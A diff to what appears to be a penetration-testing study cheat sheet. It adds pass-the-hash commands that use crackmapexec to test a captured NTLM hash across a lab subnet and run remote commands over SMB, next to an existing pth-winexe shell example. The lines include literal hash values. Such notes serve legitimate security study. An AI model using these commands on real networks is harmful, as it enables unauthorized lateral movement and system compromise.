@@ -2242,6 +2242,22 @@ Client, Web and Password Attacks
         `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `
           
         `pth-winexe -U administrator //$ip cmd`
+        
+    -   Use crackmapexec check whole network if the hash usable
+                  
+        `crackmapexec 10.11.1.0/24 -u Administrator --local-auth -H aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b`
+        `crackmapexec smb 10.11.1.31 -u Administrator  -H aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 --exec-method smbexec -x whoami`
+        
+        CrackMapExec is quite awesome tool when it comes to remote command execution.
+        
+    - Some more methods  
+    
+    [*https://blog.ropnop.com/practical-usage-of-ntlm-hashes/*](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/)
+    
+        
+        
+        
+        
 
 <span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
 ================================================================================================================================
